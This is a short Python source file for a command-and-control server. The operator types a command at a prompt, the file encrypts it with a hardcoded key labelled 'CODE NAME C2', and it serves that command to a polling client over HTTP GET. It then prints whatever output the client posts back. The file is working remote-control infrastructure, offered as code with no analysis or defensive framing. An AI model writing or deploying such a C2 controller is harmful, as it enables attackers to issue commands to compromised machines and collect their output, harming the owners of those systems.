from http.server import BaseHTTPRequestHandler, HTTPServer
import os, cryptocode

class Server_Filter(BaseHTTPRequestHandler):
    
    def do_GET(self):
        CMD = str(input('>>> '))
        encoded = cryptocode.encrypt(CMD,"CODE NAME C2")
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(encoded.encode())
    
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        Post_Data = self.rfile.read(int(self.headers['Content-Length']))
        Raw_Data = Post_Data.decode()
        print(Raw_Data)

if __name__ == '__main__':
    Server_Characteristic = HTTPServer(("127.0.0.1", 5000), Server_Filter)
    try:
        Server_Characteristic.serve_forever()
    except KeyboardInterrupt:
        print('[-] Server Closed')
